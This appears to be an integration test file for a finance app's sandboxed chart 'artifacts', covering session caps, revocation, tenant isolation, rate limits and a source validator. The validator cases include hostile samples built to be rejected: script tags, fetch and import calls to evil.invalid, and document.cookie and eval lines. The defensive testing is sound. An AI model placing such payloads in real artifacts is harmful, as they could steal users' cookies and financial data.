    // Failed state migration: rename of a missing path keeps prior state.
    const migrateRes = await postJson(base, `/api/artifacts/${artifactId}/state/migrate`, cookie, {
      workspaceId,
      fromVersionId: good,
      toVersionId: good,
      operations: [{ type: "rename", path: "missing.deep", newPath: "elsewhere" }],
    });
    expect(migrateRes.status).toBe(409);
  });

  it("exclusion, revocation, session caps, stale and foreign grants fail closed", async () => {
    const base = appServers.length > 0 ? `http://127.0.0.1:${(appServers[appServers.length - 1].address() as AddressInfo).port}` : await startApp();
    const cookieA = await login(base, `synthetic-e05-exit-gate-${tag}`);
    const wsRes = await postJson(base, "/api/workspaces", cookieA, { name: `Exit Gate WS ${tag}`, baseCurrency: "EUR" });
    const workspaceId = (wsRes.json as { id: string }).id;
    const userId = ((await pool.query("SELECT id FROM users WHERE auth_subject = $1", [`synthetic-e05-exit-gate-${tag}`])).rows[0] as { id: string }).id;
    const claims: TenantClaims = { userId, workspaceId };
    const { checking, cash } = await setupManualFinance(base, cookieA, workspaceId);

    const draft = await postJson(base, "/api/artifacts", cookieA, { workspaceId, name: "Gate chart" });
    const artifactId = (draft.json as { artifactId: string }).artifactId;
    await postForm(base, `/w/${workspaceId}/artifacts/${artifactId}/versions`, cookieA, {
      html: CHART_SOURCE.html,
      css: CHART_SOURCE.css,
      js: CHART_SOURCE.js,
      manifest: JSON.stringify(CHART_SOURCE.manifest),
      expectedBaseVersionId: "",
      action: "publish",
    });
    const versionId = ((await (await fetch(`${base}/api/artifacts/${artifactId}/versions?workspaceId=${workspaceId}`, { headers: { cookie: cookieA } })).json()) as {
      versions: Array<{ versionId: string }>;
    }).versions[0].versionId;

    // Session cap: four concurrent previews open, the fifth is refused typed.
    const sessions: string[] = [];
    for (let i = 0; i < ARTIFACT_LIMITS.maxOpenSessionsPerUser; i++) {
      const view = await fetch(`${base}/w/${workspaceId}/artifacts/${artifactId}/versions/${versionId}/full`, { headers: { cookie: cookieA } });
      expect(view.status).toBe(200);
      sessions.push((await view.text()).match(/sessionId:"([0-9a-f-]{36})"/)?.[1] ?? "");
    }
    expect(sessions.every(Boolean)).toBe(true);
    const fifth = await fetch(`${base}/w/${workspaceId}/artifacts/${artifactId}/versions/${versionId}/full`, { headers: { cookie: cookieA } });
    expect(fifth.status).toBe(429);
    expect(await fifth.text()).toContain("Too many open previews");
    // Freeing one slot (Stop/DELETE expires the grant) admits a new preview.
    const freed = await fetch(`${base}/api/artifacts/sessions/${sessions[0]}`, { method: "DELETE", headers: { cookie: cookieA } });
    expect(freed.status).toBe(204);
    const reopened = await fetch(`${base}/w/${workspaceId}/artifacts/${artifactId}/versions/${versionId}/full`, { headers: { cookie: cookieA } });
    expect(reopened.status).toBe(200);
    const liveSession = (await reopened.text()).match(/sessionId:"([0-9a-f-]{36})"/)?.[1];
    expect(liveSession).toBeTruthy();
    // Cross-path: with four live grants, the API session door refuses too.
    const apiFifth = await postJson(base, "/api/artifacts/sessions", cookieA, { workspaceId, artifactId, versionId, initialState: {} });
    expect(apiFifth.status).toBe(429);
    expect(apiFifth.json).toEqual({ error: "session_limit" });

    // Open reads work against the live grant.
    const rpc = await postJson(base, "/api/artifacts/sdk/rpc", cookieA, { sessionId: liveSession, method: "spendingByCategory", args: {} });
    expect(rpc.status).toBe(200);
    expect((rpc.json as { result: { coverage: string } }).result.coverage).toBe("full");
    // Backend failures are typed without driver text crossing to the session.
    const badArgs = await postJson(base, "/api/artifacts/sdk/rpc", cookieA, { sessionId: liveSession, method: "spendingByCategory", args: { accountIds: ["not-a-uuid"] } });
    expect(badArgs.status).toBe(500);
    expect(badArgs.json).toEqual({ error: "rpc_failed" });

    // Exclude the JPY account: next reads go partial without JPY rows, and
    // the open grant is stale (policy version moved) on the next call.
    await setAccountExclusion(pool, claims, userId, cash, true, "exit test");
    const excluded = await getSpendingByCategory(pool, claims, {});
    expect(excluded.coverage).toBe("partial");
    expect(excluded.excludedAccounts).toBe(1);
    expect(excluded.groups).toEqual([{ label: "Uncategorized", amount: "9007199254916992" }]);
    const rpcPartial = await postJson(base, "/api/artifacts/sdk/rpc", cookieA, { sessionId: liveSession, method: "spendingByCategory", args: {} });
    expect(rpcPartial.status).toBe(409);
    expect(rpcPartial.json).toMatchObject({ error: "conflict", reason: "grant_stale" });

    // Forged session and forged method fail closed without leaks; a forged
    // session with a bad method still 404s (validity is checked first).
    const forged = await postJson(base, "/api/artifacts/sdk/rpc", cookieA, { sessionId: randomUUID(), method: "spendingByCategory", args: {} });
    expect(forged.status).toBe(404);
    const forgedMethod = await postJson(base, "/api/artifacts/sdk/rpc", cookieA, { sessionId: randomUUID(), method: "dropTables", args: {} });
    expect(forgedMethod.status).toBe(404);
    const badMethod = await postJson(base, "/api/artifacts/sdk/rpc", cookieA, { sessionId: sessions[1], method: "dropTables", args: {} });
    expect(badMethod.status).toBe(400);
    expect(badMethod.json).toEqual({ error: "invalid_method" });

    // Foreign user cannot touch this workspace's sessions, views or publish.
    const cookieB = await login(base, `synthetic-e05-exit-gate-b-${tag}`);
    const wsB = await postJson(base, "/api/workspaces", cookieB, { name: `Exit Gate B ${tag}`, baseCurrency: "EUR" });
    expect(wsB.status).toBe(201);
    const foreignRpc = await postJson(base, "/api/artifacts/sdk/rpc", cookieB, { sessionId: sessions[1], method: "spendingByCategory", args: {} });
    expect(foreignRpc.status).toBe(404);
    const foreignView = await fetch(`${base}/w/${workspaceId}/artifacts/${artifactId}/versions/${versionId}/full`, { headers: { cookie: cookieB } });
    expect(foreignView.status).toBe(404);
    const foreignPublish = await postForm(base, `/w/${workspaceId}/artifacts/${artifactId}/versions`, cookieB, {
      html: CHART_SOURCE.html,
      css: CHART_SOURCE.css,
      js: CHART_SOURCE.js,
      manifest: JSON.stringify(CHART_SOURCE.manifest),
      expectedBaseVersionId: "",
      action: "publish",
    });
    expect(foreignPublish.status).toBe(404);
    void checking;

    // Revocation: logout stops API, preview AND publication immediately.
    const logout = await fetch(`${base}/logout`, { method: "POST", headers: { cookie: cookieA, origin: base }, redirect: "manual" });
    expect([303, 302, 200]).toContain(logout.status);
    const afterLogoutRpc = await postJson(base, "/api/artifacts/sdk/rpc", cookieA, { sessionId: sessions[1], method: "spendingByCategory", args: {} });
    expect(afterLogoutRpc.status).toBe(401);
    const afterLogoutView = await fetch(`${base}/w/${workspaceId}/artifacts/${artifactId}/versions/${versionId}/full`, { headers: { cookie: cookieA } });
    expect(afterLogoutView.status).toBe(401);
    const afterLogoutPublish = await postForm(base, `/w/${workspaceId}/artifacts/${artifactId}/versions`, cookieA, {
      html: CHART_SOURCE.html,
      css: CHART_SOURCE.css,
      js: CHART_SOURCE.js,
      manifest: JSON.stringify(CHART_SOURCE.manifest),
      expectedBaseVersionId: "",
      action: "publish",
    });
    expect(afterLogoutPublish.status).toBe(401);
  });

  it("SDK burst stays correct and bounded; no server-side flood state accrues", async () => {
    // ARTIFACT_LIMITS caps SDK calls worker-side (8 outstanding, 60/minute)
    // and server-side on the session record (same limits; 61st call in a
    // window 429s). A 60-call burst must stay correct without accruing
    // permits, usage or sessions; floods past the window fail closed 429.
    const base = appServers.length > 0 ? `http://127.0.0.1:${(appServers[appServers.length - 1].address() as AddressInfo).port}` : await startApp();
    const cookie = await login(base, `synthetic-e05-exit-burst-${tag}`);
    const wsRes = await postJson(base, "/api/workspaces", cookie, { name: `Exit Burst WS ${tag}`, baseCurrency: "EUR" });
    const workspaceId = (wsRes.json as { id: string }).id;
    const userId = ((await pool.query("SELECT id FROM users WHERE auth_subject = $1", [`synthetic-e05-exit-burst-${tag}`])).rows[0] as { id: string }).id;
    const claims: TenantClaims = { userId, workspaceId };
    await setupManualFinance(base, cookie, workspaceId);
    const draft = await postJson(base, "/api/artifacts", cookie, { workspaceId, name: "Burst chart" });
    const artifactId = (draft.json as { artifactId: string }).artifactId;
    await postForm(base, `/w/${workspaceId}/artifacts/${artifactId}/versions`, cookie, {
      html: CHART_SOURCE.html,
      css: CHART_SOURCE.css,
      js: CHART_SOURCE.js,
      manifest: JSON.stringify(CHART_SOURCE.manifest),
      expectedBaseVersionId: "",
      action: "publish",
    });
    const versionId = ((await (await fetch(`${base}/api/artifacts/${artifactId}/versions?workspaceId=${workspaceId}`, { headers: { cookie } })).json()) as {
      versions: Array<{ versionId: string }>;
    }).versions[0].versionId;
    const view = await fetch(`${base}/w/${workspaceId}/artifacts/${artifactId}/versions/${versionId}/full`, { headers: { cookie } });
    expect(view.status).toBe(200);
    const sessionId = (await view.text()).match(/sessionId:"([0-9a-f-]{36})"/)?.[1];
    expect(sessionId).toBeTruthy();
    const usageBefore = await usageLedger(claims);
    const started = Date.now();
    for (let i = 0; i < 60; i++) {
      const rpc = await postJson(base, "/api/artifacts/sdk/rpc", cookie, { sessionId, method: "spendingByCategory", args: {} });
      expect(rpc.status).toBe(200);
      expect((rpc.json as { result: { groups: unknown[] } }).result.groups.length).toBeGreaterThan(0);
    }
    expect(Date.now() - started).toBeLessThan(30_000);
    expect(await usageLedger(claims)).toEqual(usageBefore);
    // The 61st call in the same window fails closed 429 (server-side cap).
    const over = await postJson(base, "/api/artifacts/sdk/rpc", cookie, { sessionId, method: "spendingByCategory", args: {} });
    expect(over.status).toBe(429);
    expect(over.json).toMatchObject({ error: "rate_limited" });
    const grants = await withTenant(pool, claims, (client) => client.query("SELECT count(*)::int AS n FROM artifact_runtime_grants WHERE workspace_id = $1 AND user_id = $2", [workspaceId, userId]));
    expect((grants.rows[0] as { n: number }).n).toBe(1);
  });

  it("oversized results are refused typed and row output stays bounded", async () => {
    // ARTIFACT_LIMITS.maxResultBytes (1 MiB) is enforced at dispatch: a
    // 40k-point cashflow never crosses to the session, the denial is logged
    // with a typed class, and unbounded GROUP BYs cannot smuggle bulk reads.
    // transactionSummary stays capped at maxResultRows (500) by construction.
    const base = appServers.length > 0 ? `http://127.0.0.1:${(appServers[appServers.length - 1].address() as AddressInfo).port}` : await startApp();
    const cookie = await login(base, `synthetic-e05-exit-flood-${tag}`);
    const wsRes = await postJson(base, "/api/workspaces", cookie, { name: `Exit Flood WS ${tag}`, baseCurrency: "EUR" });
    const workspaceId = (wsRes.json as { id: string }).id;
    const userId = ((await pool.query("SELECT id FROM users WHERE auth_subject = $1", [`synthetic-e05-exit-flood-${tag}`])).rows[0] as { id: string }).id;
    const claims: TenantClaims = { userId, workspaceId };
    const { checking } = await setupManualFinance(base, cookie, workspaceId);
    await withTenant(pool, claims, (client) =>
      client.query(
        `INSERT INTO manual_transactions (workspace_id, id, account_id, amount_minor, currency, direction, effective_date, description, actor_id, reference)
         SELECT $1, md5('e05-flood-' || g::text)::uuid, $2, 100, 'EUR', 'OUTFLOW', date '2020-01-01' + g, 'Flood row', $3, NULL
         FROM generate_series(1, 40000) AS g`,
        [workspaceId, checking, userId],
      ),
    );
    const draft = await postJson(base, "/api/artifacts", cookie, { workspaceId, name: "Flood chart" });
    const artifactId = (draft.json as { artifactId: string }).artifactId;
    await postForm(base, `/w/${workspaceId}/artifacts/${artifactId}/versions`, cookie, {
      html: CHART_SOURCE.html,
      css: CHART_SOURCE.css,
      js: CHART_SOURCE.js,
      manifest: JSON.stringify({ ...CHART_SOURCE.manifest, requestedPermissions: ["analytics.cashflow", "transactions.summary.read"], approvedPermissions: ["analytics.cashflow", "transactions.summary.read"] }),
      expectedBaseVersionId: "",
      action: "publish",
    });
    const versionId = ((await (await fetch(`${base}/api/artifacts/${artifactId}/versions?workspaceId=${workspaceId}`, { headers: { cookie } })).json()) as {
      versions: Array<{ versionId: string }>;
    }).versions[0].versionId;
    const view = await fetch(`${base}/w/${workspaceId}/artifacts/${artifactId}/versions/${versionId}/full`, { headers: { cookie } });
    expect(view.status).toBe(200);
    const sessionId = (await view.text()).match(/sessionId:"([0-9a-f-]{36})"/)?.[1];
    const denied = await postJson(base, "/api/artifacts/sdk/rpc", cookie, { sessionId, method: "cashflow", args: {} });
    expect(denied.status).toBe(413);
    expect(denied.json).toEqual({ error: "result_too_large" });
    const logged = await withTenant(pool, claims, (client) =>
      client.query("SELECT status, error_class FROM artifact_sdk_access_events WHERE workspace_id = $1 ORDER BY created_at DESC LIMIT 1", [workspaceId]),
    );
    expect(logged.rows[0]).toMatchObject({ status: "denied", error_class: "result_too_large" });
    const capped = await postJson(base, "/api/artifacts/sdk/rpc", cookie, { sessionId, method: "transactionSummary", args: {} });
    expect(capped.status).toBe(200);
    expect((capped.json as { result: { rows: unknown[] } }).result.rows).toHaveLength(ARTIFACT_LIMITS.maxResultRows);
  });

  it("retries converge across a server restart with no duplicate versions, state or finance effects", async () => {
    const base = appServers.length > 0 ? `http://127.0.0.1:${(appServers[appServers.length - 1].address() as AddressInfo).port}` : await startApp();
    const cookie = await login(base, `synthetic-e05-exit-conv-${tag}`);
    const wsRes = await postJson(base, "/api/workspaces", cookie, { name: `Exit Conv WS ${tag}`, baseCurrency: "EUR" });
    const workspaceId = (wsRes.json as { id: string }).id;
    const userId = ((await pool.query("SELECT id FROM users WHERE auth_subject = $1", [`synthetic-e05-exit-conv-${tag}`])).rows[0] as { id: string }).id;
    const claims: TenantClaims = { userId, workspaceId };
    await setupManualFinance(base, cookie, workspaceId);

    const key = randomUUID();
    const thread = await createThread(pool, claims, userId, { title: "Convergence" });
    const runOnce = async (calls: { count: number }): Promise<{ artifactId: string; versionId: string }> => {
      const permit = await issuePermit(pool, claims, "artifact-builder");
      const transport = scripted(JSON.stringify(CHART_SOURCE));
      const counting: DispatchTransport = async (req, signal) => {
        calls.count += 1;
        return transport(req, signal);
      };
      const result = await runArtifactAiFlow(pool, claims, userId, {
        kind: "create",
        name: "Convergent chart",
        instruction: "Build a chart.",
        idempotencyKey: key,
        permitId: permit.id,
        threadId: thread.id,
      }, counting);
      if (!result.ok) throw new Error(`flow failed: ${result.errorClass}`);
      return { artifactId: result.artifactId, versionId: result.versionId };
    };
    const calls1 = { count: 0 };
    const first = await runOnce(calls1);
    expect(calls1.count).toBe(1);
    const ledgerAfterFirst = await withTenant(pool, claims, async (client) => {
      const activity = await client.query("SELECT count(*)::int AS n FROM chat_activity WHERE workspace_id = $1 AND thread_id = $2", [workspaceId, thread.id]);
      const usage = await client.query("SELECT count(*)::int AS n FROM ai_dispatch_usage WHERE workspace_id = $1", [workspaceId]);
      const reservations = await client.query("SELECT count(*)::int AS n FROM ai_dispatch_reservations WHERE workspace_id = $1", [workspaceId]);
      const proposals = await client.query("SELECT count(*)::int AS n FROM artifact_ai_proposals WHERE workspace_id = $1 AND artifact_id = $2", [workspaceId, first.artifactId]);
      return {
        activity: (activity.rows[0] as { n: number }).n,
        usage: (usage.rows[0] as { n: number }).n,
        reservations: (reservations.rows[0] as { n: number }).n,
        proposals: (proposals.rows[0] as { n: number }).n,
      };
    });
    expect(ledgerAfterFirst.proposals).toBe(1);

    // Process death between attempts: restart the HTTP servers (same process
    // keeps the in-memory session map; the DB-backed idempotency record is
    // what converges the replay) with a fresh permit and transport.
    await restartServers();
    const calls2 = { count: 0 };
    const second = await runOnce(calls2);
    expect(second).toEqual(first);
    expect(calls2.count).toBe(0);
    // Convergence covers activity, ledger, reservations and proposals: the
    // replay adds zero rows and zero charges anywhere.
    const ledgerAfterSecond = await withTenant(pool, claims, async (client) => {
      const activity = await client.query("SELECT count(*)::int AS n FROM chat_activity WHERE workspace_id = $1 AND thread_id = $2", [workspaceId, thread.id]);
      const usage = await client.query("SELECT count(*)::int AS n FROM ai_dispatch_usage WHERE workspace_id = $1", [workspaceId]);
      const reservations = await client.query("SELECT count(*)::int AS n FROM ai_dispatch_reservations WHERE workspace_id = $1", [workspaceId]);
      const proposals = await client.query("SELECT count(*)::int AS n FROM artifact_ai_proposals WHERE workspace_id = $1 AND artifact_id = $2", [workspaceId, first.artifactId]);
      return {
        activity: (activity.rows[0] as { n: number }).n,
        usage: (usage.rows[0] as { n: number }).n,
        reservations: (reservations.rows[0] as { n: number }).n,
        proposals: (proposals.rows[0] as { n: number }).n,
      };
    });
    expect(ledgerAfterSecond).toEqual(ledgerAfterFirst);

    const count = await withTenant(pool, claims, async (client) => {
      const r = await client.query("SELECT count(*)::int AS n FROM artifact_versions WHERE workspace_id = $1 AND artifact_id = $2", [workspaceId, first.artifactId]);
      const s = await client.query("SELECT count(*)::int AS n FROM artifact_state WHERE workspace_id = $1 AND artifact_id = $2", [workspaceId, first.artifactId]);
      const t = await client.query("SELECT count(*)::int AS n FROM transactions WHERE workspace_id = $1", [workspaceId]);
      const m = await client.query("SELECT count(*)::int AS n FROM manual_transactions WHERE workspace_id = $1", [workspaceId]);
      return { versions: (r.rows[0] as { n: number }).n, states: (s.rows[0] as { n: number }).n, tx: (t.rows[0] as { n: number }).n, manual: (m.rows[0] as { n: number }).n };
    });
    expect(count.versions).toBe(1);
    expect(count.states).toBe(0);
    expect(count.tx).toBe(0);
    expect(count.manual).toBe(12);
  });

  it("build validation accepts useful sources and rejects every hostile class with frozen errors", async () => {
    // 15 cases: 2 useful + 13 hostile/edge (script/handler/url/import/fetch/
    // document/eval/dynamic-import/node-globals/permission/keys/size/empty).
    // Pure validator: no DB, no browser. Each case freezes the exact outcome
    // so a weakened gate fails loudly here instead of shipping hostile code.
    const big = "x".repeat(2 * 1024 * 1024 + 1);
    const cases: Array<{ name: string; html: string; css: string; js: string; manifest: unknown; expect: { ok: boolean; errorClass?: string } }> = [
      { name: "valid chart", html: CHART_SOURCE.html, css: CHART_SOURCE.css, js: CHART_SOURCE.js, manifest: MANIFEST_BASE, expect: { ok: true } },
      { name: "valid scenario", html: SCENARIO_OUTPUT.html, css: SCENARIO_OUTPUT.css, js: SCENARIO_OUTPUT.js, manifest: MANIFEST_BASE, expect: { ok: true } },
      { name: "html script tag", html: '<section><script>alert(1)</script></section>', css: "", js: CHART_SOURCE.js, manifest: MANIFEST_BASE, expect: { ok: false, errorClass: "html_rejected" } },
      { name: "html inline handler", html: '<section><div onclick="x()">x</div></section>', css: "", js: CHART_SOURCE.js, manifest: MANIFEST_BASE, expect: { ok: false, errorClass: "html_rejected" } },
      { name: "css resource url", html: CHART_SOURCE.html, css: "section{background:url(https://evil.invalid/l)}", js: CHART_SOURCE.js, manifest: MANIFEST_BASE, expect: { ok: false, errorClass: "css_rejected" } },
      { name: "css import", html: CHART_SOURCE.html, css: '@import url("https://evil.invalid/x.css");', js: CHART_SOURCE.js, manifest: MANIFEST_BASE, expect: { ok: false, errorClass: "css_rejected" } },
      { name: "js fetch", html: CHART_SOURCE.html, css: "", js: 'fetch("https://evil.invalid");', manifest: MANIFEST_BASE, expect: { ok: false, errorClass: "js_rejected" } },
      { name: "js document", html: CHART_SOURCE.html, css: "", js: "document.cookie;", manifest: MANIFEST_BASE, expect: { ok: false, errorClass: "js_rejected" } },
      { name: "js eval", html: CHART_SOURCE.html, css: "", js: "eval('2+2');", manifest: MANIFEST_BASE, expect: { ok: false, errorClass: "js_rejected" } },
      { name: "js dynamic import", html: CHART_SOURCE.html, css: "", js: 'import("https://evil.invalid/x.js");', manifest: MANIFEST_BASE, expect: { ok: false, errorClass: "js_rejected" } },
      { name: "manifest missing entrypoints", html: CHART_SOURCE.html, css: "", js: CHART_SOURCE.js, manifest: (({ entrypoints, ...rest }: Record<string, unknown>) => (void entrypoints, rest))(MANIFEST_BASE as Record<string, unknown>), expect: { ok: false, errorClass: "manifest_invalid" } },
      { name: "manifest expanded permission", html: CHART_SOURCE.html, css: "", js: CHART_SOURCE.js, manifest: { ...MANIFEST_BASE, requestedPermissions: ["transactions.raw.read"], approvedPermissions: ["transactions.raw.read"] }, expect: { ok: false, errorClass: "permission_denied" } },
      { name: "js node globals", html: CHART_SOURCE.html, css: "", js: "process.env.X;require('x');Deno.cwd();Bun.file('x');", manifest: MANIFEST_BASE, expect: { ok: false, errorClass: "js_rejected" } },
      // Empty code is benign-empty, not hostile: the gate accepts it and the
      // artifact renders nothing. Frozen here so any change fails loudly.
      { name: "empty js", html: CHART_SOURCE.html, css: "", js: "", manifest: MANIFEST_BASE, expect: { ok: true } },
      { name: "oversized source", html: big, css: "", js: "", manifest: MANIFEST_BASE, expect: { ok: false, errorClass: "source_too_large" } },
    ];
    for (const c of cases) {
      const check = validateArtifactSource({ html: c.html, css: c.css, js: c.js }, c.manifest);
      expect(check.ok, c.name).toBe(c.expect.ok);
      if (!c.expect.ok) expect((check as { errorClass: string }).errorClass, c.name).toBe(c.expect.errorClass);
    }
  });

  it("worker finance RPC resolves parsed JSON through real QuickJS; SDK caps and amount boundary hold", async () => {
    // Drives apps/worker/src/artifact-worker.ts in Node with a self shim:
    // proves the thenable string-crossing fix and the per-session SDK call
    // cap with the shipped worker code, no mocks of the worker itself. Each
    // leg reloads the module (fresh per-session call counters, same as a new
    // worker thread in production).
    const loadWorker = async (): Promise<{
      posted: Array<{ type: string; protocol: number; nonce: string; value?: unknown }>;
      send: (event: { data: unknown }) => unknown;
      nonce: string;
      start: (js: string) => { type: string; protocol: number; nonce: string; source: { html: string; css: string; js: string }; state: Record<string, unknown>; finance: Record<string, unknown>; manifest: unknown };
    }> => {
      const posted: Array<{ type: string; protocol: number; nonce: string; value?: unknown }> = [];
      const shim = {
        closed: false,
        onmessage: null as null | ((event: { data: unknown }) => unknown),
        postMessage: (message: { type: string; protocol: number; nonce: string; value?: unknown }): void => {
          posted.push(message);
        },
        close: (): void => {
          shim.closed = true;
        },
      };
      (globalThis as Record<string, unknown>).self = shim;
      await vi.resetModules();
      await import("../apps/worker/src/artifact-worker.ts");
      const send = shim.onmessage;
      if (!send) throw new Error("worker did not install onmessage");
      const nonce = `e05-exit-worker-${randomUUID()}`;
      const manifest = { ...MANIFEST_BASE, createdAt: "2026-01-01T00:00:00.000Z" };
      const start = (js: string): { type: string; protocol: number; nonce: string; source: { html: string; css: string; js: string }; state: Record<string, unknown>; finance: Record<string, unknown>; manifest: unknown } => ({
        type: "start", protocol: 1, nonce, source: { html: "<section></section>", css: "", js }, state: {}, finance: {}, manifest,
      });
      return { posted, send, nonce, start };
    };

    // Success leg: finance call → rpc_request → scripted result → the artifact
    // callback receives the parsed object serialized back through JSON.
    {
      const { posted, send, nonce, start } = await loadWorker();
      await send({ data: start(`artifact.finance.spendingByCategory({}).then(function(json){ var d = JSON.parse(json); artifact.ui.patch({slot:"value", text:d.groups.length + ":" + d.coverage}); });`) });
      const req = posted.find((p) => p.type === "rpc_request");
      expect(req?.value).toMatchObject({ method: "spendingByCategory", args: {} });
      expect(typeof (req?.value as { requestId: string }).requestId).toBe("string");
      for (const p of posted) expect(p).toMatchObject({ protocol: 1, nonce });
      await send({ data: { type: "rpc_response", protocol: 1, nonce, value: { requestId: (req?.value as { requestId: string }).requestId, result: { groups: [{ label: "Uncategorized", amount: "9007199254802716" }], coverage: "full" } } } });
      expect(posted.find((p) => p.type === "patch")).toMatchObject({ value: { slot: "value", text: "1:full" } });
    }

    // Error leg: a rejected grant arrives as the rejection reason string.
    {
      const { posted, send, nonce, start } = await loadWorker();
      await send({ data: start(`artifact.finance.cashflow({}).then(function(){ artifact.ui.patch({slot:"value", text:"unexpected"}); }, function(err){ artifact.ui.patch({slot:"value", text:"err:" + err}); });`) });
      const req2 = posted.find((p) => p.type === "rpc_request");
      await send({ data: { type: "rpc_response", protocol: 1, nonce, value: { requestId: (req2?.value as { requestId: string }).requestId, error: "grant_stale" } } });
      expect(posted.find((p) => p.type === "patch")).toMatchObject({ value: { slot: "value", text: "err:grant_stale" } });
    }

    // SDK call cap: the 9th finance call in one session throws typed.
    {
      const { posted, send, start } = await loadWorker();
      await send({ data: start(`var errs = 0; for (var i = 0; i < 9; i++) { try { artifact.finance.cashflow({}); } catch (e) { errs++; } } artifact.ui.patch({slot:"value", text:"errs:" + errs});`) });
      expect(posted.filter((p) => p.type === "rpc_request")).toHaveLength(ARTIFACT_LIMITS.maxSdkCallsPerSession);
      expect(posted.find((p) => p.type === "patch")).toMatchObject({ value: { slot: "value", text: "errs:1" } });
    }

    // Chart leg: converted major-unit rows pass worker validation and cross
    // to the renderer with exact values (invalid rows would reject instead).
    {
      const { posted, send, nonce, start } = await loadWorker();
      await send({ data: start(`artifact.finance.getBalances({}).then(function(json){ var d = JSON.parse(json); artifact.ui.render({type:"chart", rows:[{label:"Checking", amount:"1500.00"}]}); });`) });
      const req = posted.find((p) => p.type === "rpc_request");
      await send({ data: { type: "rpc_response", protocol: 1, nonce, value: { requestId: (req?.value as { requestId: string }).requestId, result: { balances: [{ accountId: "a", amount: "150000", currency: "EUR" }] } } } });
      expect(posted.find((p) => p.type === "render")).toMatchObject({ value: { type: "chart", rows: [{ label: "Checking", amount: "1500.00" }] } });
    }

    // Scenario interactivity leg: a host event reaches artifact code and the
    // patched slot carries the exact event value back out.
    {
      const { posted, send, nonce, start } = await loadWorker();
      await send({ data: start(`globalThis.onEvent = function(e){ artifact.ui.patch({ slot: "value", text: String(e.value) }); };`) });
      await send({ data: { type: "event", protocol: 1, nonce, value: { action: "months", value: "6" } } });
      expect(posted.find((p) => p.type === "patch")).toMatchObject({ value: { slot: "value", text: "6" } });
    }

    // Fan-out leg: two .then() handlers on one call both resolve once.
    {
      const { posted, send, nonce, start } = await loadWorker();
      await send({ data: start(`var t = artifact.finance.cashflow({}); t.then(function(j){ artifact.ui.patch({slot:"value", text:"first"}); }); t.then(function(j){ artifact.ui.patch({slot:"other", text:"second"}); });`) });
      const req = posted.find((p) => p.type === "rpc_request");
      await send({ data: { type: "rpc_response", protocol: 1, nonce, value: { requestId: (req?.value as { requestId: string }).requestId, result: {} } } });
      const patches = posted.filter((p) => p.type === "patch").map((p) => p.value);
      expect(patches).toContainEqual({ slot: "value", text: "first" });
      expect(patches).toContainEqual({ slot: "other", text: "second" });
    }

    // Amount boundary (contract §E05-S07 note): SDK minor strings convert to
    // chart-legal major strings with the row currency's exponent; JPY majors
    // carry no decimals, so artifact authors scale/group explicitly there.
    expect(formatMinor(150000n, "EUR")).toBe("1500.00");
    expect(/^-?\d+\.\d{2}$/.test(formatMinor(150000n, "EUR"))).toBe(true);
    expect(formatMinor(4200n, "JPY")).toBe("4200");
    expect(/^-?\d+\.\d{2}$/.test(formatMinor(4200n, "JPY"))).toBe(false);
    delete (globalThis as Record<string, unknown>).self;
  });
});
